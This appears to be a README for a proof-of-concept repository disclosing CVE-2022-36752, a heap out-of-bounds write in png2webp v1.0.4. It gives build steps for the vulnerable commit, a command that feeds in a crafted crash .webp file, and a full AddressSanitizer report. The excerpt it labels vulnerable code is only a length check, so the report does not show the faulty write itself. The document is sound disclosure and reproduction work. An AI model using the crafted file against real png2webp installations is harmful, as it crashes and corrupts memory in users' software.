# Description for CVE-2022-36752

png2webp v1.0.4 was discovered to contain an out-of-bounds write via the function w2p. This vulnerability is exploitable via a crafted webp file when reversing the format back to png.

# Reproduction

To reproduce the vulnerability, download the vulnerable version of png2webp (v1.0.4) and compile the project:

```
git clone https://github.com/landfillbaby/png2webp.git
cd png2webp
git checkout 0c7119109cde91127a263bf0af252e5e730f7fba
git submodule update --init --depth 1
./configure && make
```

Once the project has been compiled, we can point png2webp towards our malicious .webp file included in this repository (CVE-2022-36752_crash.webp):

```
./png2web -r CVE-2022-36752_crash.webp
```

The previous command will produce a crash and return an error message:

```
corrupted size vs. prev_size
```

To gain a better understanding of where the crash is taking place, lets recompile the project with address sanitizer (ASAN) by adding -fsanitize=address to the CFLAGS variable in the Makefile. We also want the compiler to store symbol table information in the executable (-g flag) to help us determine which line of code produced the crash:

```
ifeq (${uname_m},x86_64)
CFLAGS ?= -O3 -Wall -Wextra -pipe -flto=auto -DNDEBUG -march=x86-64-v2 -fsanitize=address -g
```

Next we will clean any stale files and recompile the project:

```
make clean
make
```

ASAN reports an invalid write of size 12 in the program, confirming the existance of an out-of-bounds write vulnerability:

```
==222970==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x602000000010 at pc 0x563e3ec4ee6a bp 0x7fff3a7b04d0 sp 0x7fff3a7b04c8
WRITE of size 12 at 0x602000000010 thread T0
    #0 0x563e3ec4ee69  (/dev/shm/png2webp/png2webp+0x23e69)
    #1 0x563e3ec3df34  (/dev/shm/png2webp/png2webp+0x12f34)
    #2 0x7fcfe4967189 in __libc_start_call_main ../sysdeps/nptl/libc_start_call_main.h:58
    #3 0x7fcfe4967244 in __libc_start_main_impl ../csu/libc-start.c:381
    #4 0x563e3ec3e3f0  (/dev/shm/png2webp/png2webp+0x133f0)

0x602000000017 is located 0 bytes to the right of 7-byte region [0x602000000010,0x602000000017)
allocated by thread T0 here:
    #0 0x7fcfe4cae7cf in __interceptor_malloc ../../../../src/libsanitizer/asan/asan_malloc_linux.cpp:145
    #1 0x563e3ec46052  (/dev/shm/png2webp/png2webp+0x1b052)

SUMMARY: AddressSanitizer: heap-buffer-overflow (/dev/shm/png2webp/png2webp+0x23e69) 
Shadow bytes around the buggy address:
  0x0c047fff7fb0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x0c047fff7fc0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x0c047fff7fd0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x0c047fff7fe0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x0c047fff7ff0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
=>0x0c047fff8000: fa fa[07]fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c047fff8010: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c047fff8020: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c047fff8030: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c047fff8040: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c047fff8050: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
Shadow byte legend (one shadow byte represents 8 application bytes):
  Addressable:           00
  Partially addressable: 01 02 03 04 05 06 07 
  Heap left redzone:       fa
  Freed heap region:       fd
  Stack left redzone:      f1
  Stack mid redzone:       f2
  Stack right redzone:     f3
  Stack after return:      f5
  Stack use after scope:   f8
  Global redzone:          f9
  Global init order:       f6
  Poisoned by user:        f7
  Container overflow:      fc
  Array cookie:            ac
  Intra object redzone:    bb
  ASan internal:           fe
  Left alloca redzone:     ca
  Right alloca redzone:    cb
  Shadow gap:              cc
==222970==ABORTING

```

# Vulnerable code in the function w2p():
```
  if(l < 12
#ifdef SSIZE_MAX
    || l - 12 > SSIZE_MAX
#endif
  ) {
    PF("ERROR reading %s: %s", IP, k[2]);
    goto w2p_close;
  }
```

# References
* https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-36752
* https://cwe.mitre.org/data/definitions/787.html
